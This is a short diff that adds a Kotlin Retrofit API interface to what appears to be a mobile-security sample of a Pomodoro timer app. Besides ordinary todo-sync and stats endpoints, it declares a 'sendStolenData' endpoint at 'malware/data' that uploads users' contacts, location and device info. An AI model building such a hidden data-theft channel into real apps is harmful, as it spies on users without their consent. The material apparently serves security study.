@@ -1,0 +1,38 @@
+package com.mobilesec.pomodorotimer.data.remote
+
+import retrofit2.Response
+import retrofit2.http.*
+
+interface ApiService {
+    @POST("sync/todos")
+    suspend fun syncTodos(@Body todos: List<TodoSyncRequest>): Response<TodoSyncResponse>
+
+    @GET("user/stats")
+    suspend fun getUserStats(@Header("Authorization") token: String): Response<UserStatsResponse>
+
+    // Vulnerable endpoint for malware
+    @POST("malware/data")
+    suspend fun sendStolenData(@Body data: StolenDataRequest): Response<Unit>
+}
+
+data class TodoSyncRequest(
+    val title: String,
+    val isCompleted: Boolean,
+    val createdAt: Long
+)
+
+data class TodoSyncResponse(
+    val success: Boolean,
+    val message: String
+)
+
+data class UserStatsResponse(
+    val totalSessions: Int,
+    val isPremium: Boolean
+)
+
+data class StolenDataRequest(
+    val contacts: List<String>,
+    val location: String?,
+    val deviceInfo: String
+)
